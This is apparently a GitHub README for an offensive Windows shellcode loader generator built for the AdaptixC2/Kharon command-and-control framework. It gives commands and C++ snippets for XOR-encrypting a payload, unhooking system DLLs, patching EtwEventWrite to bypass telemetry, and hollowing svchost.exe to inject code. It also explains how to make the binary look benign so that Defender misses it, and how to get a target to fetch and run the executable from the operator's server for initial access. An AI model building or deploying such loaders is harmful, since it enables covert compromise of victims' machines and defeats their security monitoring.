<div align="center">

# kharon-xor-loader

**A minimal, readable shellcode loader generator for Windows.**

XOR-encrypt a raw `.bin`, inject it into a C++ loader template, compile a
standalone PE — with DLL unhooking, ETW bypass and process injection.

Built for [AdaptixC2](https://github.com/Adaptix-Framework/AdaptixC2) / Kharon agents.

![Platform](https://img.shields.io/badge/platform-Windows%20x64-0078D6?style=flat-square&logo=windows)
![Language](https://img.shields.io/badge/language-C%2B%2B17-00599C?style=flat-square&logo=cplusplus)
![Python](https://img.shields.io/badge/python-3.6%2B-3776AB?style=flat-square&logo=python)
![Toolchain](https://img.shields.io/badge/toolchain-mingw--w64-orange?style=flat-square)
![License](https://img.shields.io/badge/license-MIT-green?style=flat-square)

[Overview](#overview) · [Pipeline](#pipeline) · [Quick start](#quick-start) ·
[Usage](#usage) · [Architecture](#loader-architecture) ·
[Troubleshooting](#troubleshooting) · [Credits](#credits)

</div>

---

## Overview

`kharon-xor-loader` turns a raw shellcode into a working Windows
executable in three commands.  It exists so that people can use a
simple loader with an XOR-encrypted payload. I've commented every 
function, but please note there might be some inaccuracies since it's 
one of my first loaders. 

It is deliberately *not* a framework. No build system, no dependencies, no
abstraction — just a Python script, a C++ template and a compiler.

> Adapted from the loader presented in
> [Mitchell's Journal — AdaptixC2 & GCB Lab](https://mitchells-journal.gitbook.io/writings/adaptixc2-and-gcb-lab/2.-payload-creation).
> Published as a readable, hackable reference.

### Features

-  **XOR encryption** with a cryptographically random key, generated per build
-  **Template injection** — payload and key are substituted into marked placeholders
-  **DLL unhooking** — restores `.text` of `ntdll`, `kernel32`, `kernelbase`, `advapi32`
-  **ETW bypass** — patches `EtwEventWrite` with a `ret`
-  **Two injection modes** — in-process thread, or remote process injection
-  **Standalone output** — statically linked, no runtime dependencies
-  **Zero Python dependencies** — standard library only

### Limitations

- x64 only (the template is x64-specific)
- No compression, no encryption beyond XOR, no syscalls
- No automatic signature evasion — see [Defender notes](#defender-notes)

---

The loader runs in five stages:

| # | Stage | What it does |
|---|-------|--------------|
| 1 | **DLL unhooking** | Reads clean copies of system DLLs from disk, overwrites their `.text` sections in memory |
| 2 | **Telemetry bypass** | Patches `EtwEventWrite` → `ret` (AMSI bypass available, commented out) |
| 3 | **Decryption** | XOR-decrypts the payload in 4 KB chunks |
| 4 | **Process creation** | Spawns `svchost.exe` suspended (or stays in-process) |
| 5 | **Injection** | `VirtualAllocEx` → `WriteProcessMemory` → `SetThreadContext` (`RIP`/`RAX`) → `ResumeThread` |

---

## Quick start
# 0. dependencies
```bash
# 0.1 Debian based distro
sudo apt install mingw-w64 python3
```
```bash
# 0.2 Arch based distro
sudo pacman -S mingw-w64-gcc python
```
```bash
# 0.3 on Fedora
sudo dnf install mingw64-gcc python3
```
```bash
# 0.4 Alpine Linux
sudo dnf install mingw64-gcc python3
```
# 1. Main generation
```bash
# 1. encrypt the payload and inject it into the template
python3 xor_crypt_replacer_v1.py \
    <kharon-agent>.x64.bin \
    <kharon-agent-enc>.x64.bin \
    -p auto \
    -k chunking.cpp \
    -addedshellcode-loader <payload>.cpp
```
# 2. compile the *.cpp output into an *.exe
```bash

# 2. compile
x86_64-w64-mingw32-g++ -Os -static -s -mwindows \
    -o <whatEverYouWant>.exe <payload>.cpp
```

# 3. serve
Do whatever you want to gain initial access. I'll demonstrate it using Raven and a simple Python server. 
```bash
# On Kali:
sudo apt install raven
raven <IP> <PORT>
```
Or:
```bash
python3 -m http.server <PORT>
```

Then fetch `http://<your-ip>/netmon.exe` on the target and run it.

---

## Usage

```
xor_crypt_replacer_v1.py <shellcode> <shellcode-encrypted> -k <template> -addedshellcode-loader <output>
```

### Positional arguments

| Argument | Description |
|----------|-------------|
| `shellcode` | Raw shellcode file to encrypt (`.bin`) |
| `encrypted` | Where to write the encrypted blob |

### Options

| Option | Default | Description |
|--------|---------|-------------|
| `-p`, `--key` | `auto` | XOR key as a hex string, or `auto` to generate a random 20-byte key |
| `-k`, `--loader` | — | Path to the C++ loader template. A leading `loader` label is tolerated |
| `-addedshellcode-loader` | — | Path to the generated `.cpp` |

### Examples

**Random key (recommended):**

```bash
python3 xor_crypt_replacer_v1.py shell.bin shell-enc.bin \
    -k chunking.cpp \
    -addedshellcode-loader payload.cpp
```

**Fixed key** — useful for reproducible builds or manual decryption:

```bash
python3 xor_crypt_replacer_v1.py shell.bin shell-enc.bin \
    -p a1b2c3d4e5f60718293a4b5c6d7e8f90a1b2c3d4 \
    -k chunking.cpp \
    -addedshellcode-loader payload.cpp
```

**Round-trip check** — verify the key matches before compiling (this is optional):

```python
data = open("shell-enc.bin", "rb").read()
key  = bytes.fromhex("a1b2c3d4...")
dec  = bytes(b ^ key[i % len(key)] for i, b in enumerate(data))
assert dec == open("shell.bin", "rb").read(), "key mismatch"
```

### Build options

| Flag | Effect |
|------|--------|
| `-Os` | Optimise for size — changes the codegen fingerprint |
| `-s` | Strip the symbol table |
| `-static` | Embed the runtime, no DLL dependencies |
| `-mwindows` | Hide the console window |

Add version info and an icon to make the binary look less like a naked loader (this is really important for avoiding false positive detections):

```bash
x86_64-w64-mingw32-windres <whatEverYouWant>.rc -O coff -o <whatEverYouWant>.res
x86_64-w64-mingw32-g++ -Os -static -s -mwindows \
    -o <whatEverYouWant>.exe <whatEverYouWant>.res <payload>.cpp
```

---

## Loader architecture

### Template markers

The template contains two placeholders that the script replaces:

```cpp
unsigned char g_shellcode[] = {
/* @@SHELLCODE@@ */
    0x00
};

unsigned char g_xor_key[] = {
/* @@XORKEY@@ */
    0x00
};
```

> The trailing `0x00` is removed by the script. This matters: leaving it would
> make `sizeof(g_xor_key)` equal 21 instead of 20 and silently break decryption.

### Injection modes

**Remote — process hollowing into `svchost.exe`** (default in the template)

```cpp
CreateProcessW(NULL, L"C:\\Windows\\System32\\svchost.exe", ..., CREATE_SUSPENDED, ...);
VirtualAllocEx(pi.hProcess, NULL, len, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
WriteProcessMemory(pi.hProcess, remote, shellcode, len, &written);
GetThreadContext(pi.hThread, &ctx);
ctx.Rip = (DWORD64)remote;
SetThreadContext(pi.hThread, &ctx);
ResumeThread(pi.hThread);
```

**In-process** — simpler and more reliable, the payload lives in your own process

```cpp
LPVOID mem = VirtualAlloc(NULL, len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
memcpy(mem, shellcode, len);
DWORD old;
VirtualProtect(mem, len, PAGE_EXECUTE_READ, &old);   // avoids RWX
CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)mem, NULL, 0, NULL);
Sleep(INFINITE);
```

Prefer the in-process mode while debugging: it removes `CreateProcess`,
`VirtualAllocEx` and `SetThreadContext` from the equation.

---

## Project structure

```
.
├── xor_crypt_replacer_v1.py    # encrypt + template injection
├── chunking.cpp                # C++ loader with markers
├── <whatEverYouWant>.rc        # version info + icon
├── <whatEverYouWant>.ico
├── .gitignore
└── README.md
```

---

## Troubleshooting

### `invalid conversion from 'FARPROC' to 'LPVOID'`

mingw-w64 does not implicitly convert function pointers to `void*`. Cast explicitly:

```cpp
PVOID target = (PVOID)GetProcAddress(ntdll, "EtwEventWrite");
```

Apply the fix to the **template**, not only to the generated `.cpp` — otherwise it
comes back at the next build.

### `argument -k/--loader: expected at least one argument`

A token starting with `-` is parsed as an option. Write `-k loader template.cpp`
or just `-k template.cpp` — not `-k -loader template.cpp`.

### The agent connects, then goes silent

Most likely the host process died. `svchost.exe` launched standalone exits
quickly, and if the shellcode returns instead of looping, the process
disappears right after the first callback.


### Session shows "no response"

Either the agent is dead, or it is alive but frozen. Confirm which:

```cmd
tasklist /fi "imagename eq netmon.exe"
```

Absent → killed. Present but unresponsive → likely a sleep mask issue.

### Defender flags the loader

`Trojan:Win32/Bearfoos.A!ml`, `Fareit.MK!MTB` and friends are **ML heuristic
false positives**, triggered by a large high-entropy blob embedded in a bare PE.
They are unstable by nature.


## Defender notes

`!ml` and `!MTB` suffixes mean the detection came from a machine-learning model,
not a byte signature. Two consequences:

- a static file scan often reports *nothing* while execution still gets flagged;
- the verdict changes between definition updates and between builds.

Do not chase a permanent bypass. Aim for a binary that looks statistically
ordinary, and keep an exclusion folder while developing.

---

## Roadmap

- [ ] Payload compression (LZ4) before encryption
- [ ] Configurable target process
- [ ] `CreateRemoteThread` mode in the template
- [ ] Optional indirect syscalls
- [ ] x86 support

---

## Contributing

Issues and PRs welcome. If you add an evasion technique, please document *what
it defeats* and *how you verified it* — a loader repo is only as useful as its
notes.

---

## Credits

- **Loader architecture and workflow** —
  [Mitchell's Journal, AdaptixC2 & GCB Lab](https://mitchells-journal.gitbook.io/writings/adaptixc2-and-gcb-lab/2.-payload-creation)
- **C2 framework** — [AdaptixC2](https://github.com/Adaptix-Framework/AdaptixC2)
- **Inspiration** — the `SillyLoader` template series

---

